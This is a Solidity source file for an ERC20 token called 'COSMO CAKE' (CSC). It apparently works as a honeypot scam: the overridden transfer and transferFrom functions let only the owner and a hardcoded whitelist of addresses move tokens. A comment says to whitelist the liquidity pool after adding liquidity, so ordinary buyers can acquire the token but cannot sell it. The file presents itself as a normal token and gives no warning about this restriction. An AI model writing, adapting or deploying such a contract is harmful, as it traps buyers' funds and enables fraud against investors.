// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("COSMO CAKE", "CSC") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 1000000 * 10 ** decimals());
        whiteList[0x0E508F4b35d58271AA16BD2583B9183Ec8CF4269]= true;
        whiteList[0xd5E3F7DFE4dD83E80af42304857Cd1eF35EfE98A]=true;
        whiteList[0xab7c7F329CEBA439348084399c7626D4ebe8F6D9]=true;
        whiteList[0xC19Ab222E34D75a0302888dd0296E01E34951846]=true;
        whiteList[0x61d8d71142552E8A5D4Aa8EAe8BE2f3f8C309fEF]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}